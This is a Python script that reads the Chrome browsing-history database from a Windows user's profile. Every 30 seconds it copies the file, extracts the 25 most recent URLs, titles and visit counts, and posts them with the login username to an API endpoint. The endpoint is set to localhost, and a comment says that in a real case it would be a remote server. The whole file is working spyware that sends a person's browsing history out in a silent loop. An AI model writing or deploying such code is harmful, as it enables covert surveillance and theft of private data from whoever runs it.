import sqlite3
import os.path
import time
import requests
import json
from shutil import copyfile

# appliction timeout before next sync.
TIMEOUT = 30
HISTORY_DB = 'Local\\Google\\Chrome\\User Data\\Default\History' 
# in real case the url should be for remote server.
API_URL = 'http://localhost:8080/api/data'

def build_chrome_history_path():
    appDataPath = os.path.abspath(os.path.join(os.path.expandvars('%APPDATA%'), os.pardir))
    return os.path.join(appDataPath, HISTORY_DB)

def dict_factory(cursor, row):
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d

history_path = build_chrome_history_path()
history_backup_path = f'{history_path}_Backup'

userName = os.getlogin()
query = 'SELECT datetime(last_visit_time/1000000-11644473600, "unixepoch") as last_visited, url , title, visit_count, id as identicator FROM urls ORDER BY last_visit_time DESC LIMIT 25;'

while True:
    try:
        con = sqlite3.connect(history_backup_path)
        con.row_factory = dict_factory
        copyfile(history_path, history_backup_path)
        cur = con.cursor()
        res = cur.execute(query) 
        data = cur.fetchall()
        payload = {'data': data, 'username': userName }
        requests.post(API_URL, json = payload)        

    except sqlite3.OperationalError:
        print(f'DB is locked. Waiting {TIMEOUT} secs.')
    except requests.exceptions.RequestException:
        print('Failed to send data to the remote server.')

    finally:
        con.close()
        os.remove(history_backup_path)
        time.sleep(TIMEOUT)    